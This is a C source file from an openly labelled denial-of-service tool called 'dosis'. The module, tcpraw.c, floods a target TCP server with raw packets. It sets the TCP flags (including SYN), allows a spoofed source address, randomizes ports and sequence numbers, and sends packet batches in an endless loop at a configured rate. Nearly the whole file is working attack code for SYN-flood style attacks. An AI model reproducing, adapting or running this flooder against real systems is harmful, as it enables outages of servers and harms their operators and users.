/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "pthreadex.h"
#include "tcpraw.h"
#include "tea.h"

typedef struct _tag_TCPRAW_CFG {
  /* options */
  TEA_TYPE_ADDR      shost;
  TEA_TYPE_ADDR      dhost;
  TEA_TYPE_INT       pattern;
  TEA_TYPE_INT       npackets;
  TEA_TYPE_FLOAT     hitratio;
  TEA_TYPE_DATA      payload;
  TEA_TYPE_STRING    tcp_flags;
  TEA_TYPE_INT       tcp_win;

  /* other things */
  int                tcp_flags_bitmap;
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} TCPRAW_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpraw__listen_check(THREAD_WORK *tw, int proto, char *msg, unsigned int size)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  switch(proto)
  {
    case INET_FAMILY_IPV4:
      /* check msg size and headers */
      if(!IPV4_TCP_HDRCK(msg, size))
        return 0;

      /* check msg */
      return IPV4_SADDR(msg) == tc->dhost.addr.addr.in.addr
          && ntohs(IPV4_TCP_SPORT(msg)) == tc->dhost.port
             ? -255 : 0;

    case INET_FAMILY_IPV6:
#warning "IPv6 not implemented."
      return 0;
  }

  return 0;
}

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  unsigned int seq;
  unsigned sport, dport;
  int i;

  sport = dport = 1337;
  seq   = NEXT_RAND_PORT(time(NULL));

  /* ATTACK */
  while(1)
  {
    /* build TCP packet with payload (if requested) */
    TDBG2("Sending %d packet(s)...", tc->npackets);
    for(i = 0; i < tc->npackets; i++)
    {
      sport = tc->shost.port >= 0
                ? tc->shost.port
                : NEXT_RAND_PORT(sport);
      dport = tc->dhost.port >= 0
                ? tc->dhost.port
                : NEXT_RAND_PORT(dport);
      seq += (NEXT_RAND_PORT(seq) & 0x1f);
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr, sport,
                         &tc->dhost.addr, dport,
                         tc->tcp_flags_bitmap,
                         tc->tcp_win,
                         seq, 0,
                         (char *) tc->payload.data, tc->payload.size,
                         NULL, 0);
    }

    /* now wait for more work */
    if(tc->hitratio > 0)
      if(pthreadex_timer_wait(&(tc->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpraw__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* first initialization (specialized work thread data) */
  if(first_time)
  {
    /* initialize libnet */
    TDBG("Initializing libnet.");
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
    {
      TERR("No memory for LN_CONTEXT.");
      return -1;
    }
    ln_init_context(tc->lnc);

    pthreadex_timer_init(&(tc->timer), 0.0);
    pthreadex_timer_name(&(tc->timer), "tcpraw-timer");
  }

  /* configure src address (if not defined) */
  if(tc->shost.addr.type == INET_FAMILY_NONE
  && dos_get_source_address(&tc->shost.addr, &tc->dhost.addr))
    return -1;

  /* check params sanity */
  if(tc->pattern != TYPE_PERIODIC)
  {
    TERR("Uknown pattern %d.", tc->pattern);
    return -1;
  }
  if(tc->npackets < 0)
    TWRN("Bad number of packets %d.", tc->npackets);
  if(tc->hitratio < 0)
  {
    TERR("Bad hit ratio '%f'.", tc->hitratio);
    return -1;
  }

  /* configure timer */
  if(tc->hitratio > 0)
    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.npackets = %d", tc->npackets);
    TDBG2("config.periodic.ratio    = %f", tc->hitratio);

    ip_addr_snprintf(&tc->shost.addr, tc->shost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.shost     = %s", buff);
    ip_addr_snprintf(&tc->dhost.addr, tc->dhost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost     = %s", buff);
    TDBG2("config.options.tcp_flags = %x (%s)", tc->tcp_flags_bitmap, tc->tcp_flags);
    TDBG2("config.options.tcp_win   = %x", tc->tcp_win);
  }

  return 0;
}

static void tcpraw__cleanup(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  free(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  if(tc->payload.data)
  {
    free(tc->payload.data);
    tc->payload.data = NULL;
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int cfg_cb_update_flags(TEA_OBJCFG *oc, THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  int i;

  /* precalculate flags */
  tc->tcp_flags_bitmap = 0;
  for(i = 0; tc->tcp_flags[i]; i++)
    switch(toupper(tc->tcp_flags[i]))
    {
      case 'U': tc->tcp_flags_bitmap |= 0x20; break; /* urgent */
      case 'A': tc->tcp_flags_bitmap |= 0x10; break; /* ack    */
      case 'P': tc->tcp_flags_bitmap |= 0x08; break; /* push   */
      case 'R': tc->tcp_flags_bitmap |= 0x04; break; /* reset  */
      case 'S': tc->tcp_flags_bitmap |= 0x02; break; /* syn    */
      case 'F': tc->tcp_flags_bitmap |= 0x01; break; /* fin    */
      default:
        ERR("Unknown TCP flag '%c'.", tc->tcp_flags[i]);
        return -1;
    }

  return 0;
}

TOC_BEGIN(tcpraw_cfg_def)
  TOC("dst_addr",       TEA_TYPE_ADDR,   1, TCPRAW_CFG, dhost,      NULL)
  TOC("dst_port",       TEA_TYPE_PORT,   0, TCPRAW_CFG, dhost,      NULL)
  TOC("pattern",        TEA_TYPE_INT,    1, TCPRAW_CFG, pattern,    NULL)
  TOC("payload",        TEA_TYPE_DATA,   0, TCPRAW_CFG, payload,    NULL)
  TOC("periodic_ratio", TEA_TYPE_FLOAT,  1, TCPRAW_CFG, hitratio,   NULL)
  TOC("periodic_n",     TEA_TYPE_INT,    1, TCPRAW_CFG, npackets,   NULL)
  TOC("src_addr",       TEA_TYPE_ADDR,   0, TCPRAW_CFG, shost,      NULL)
  TOC("src_port",       TEA_TYPE_PORT,   0, TCPRAW_CFG, shost,      NULL)
  TOC("tcp_flags",      TEA_TYPE_STRING, 1, TCPRAW_CFG, tcp_flags,  cfg_cb_update_flags)
  TOC("tcp_win",        TEA_TYPE_INT,    1, TCPRAW_CFG, tcp_win,    NULL)
TOC_END

TEA_OBJECT teaTCPRAW = {
  .name         = "TCPRAW",
  .datasize     = sizeof(TCPRAW_CFG),
  .configure    = tcpraw__configure,
  .cleanup      = tcpraw__cleanup,
  .listen_check = tcpraw__listen_check,
  .thread       = tcpraw__thread,
  .cparams      = tcpraw_cfg_def
};

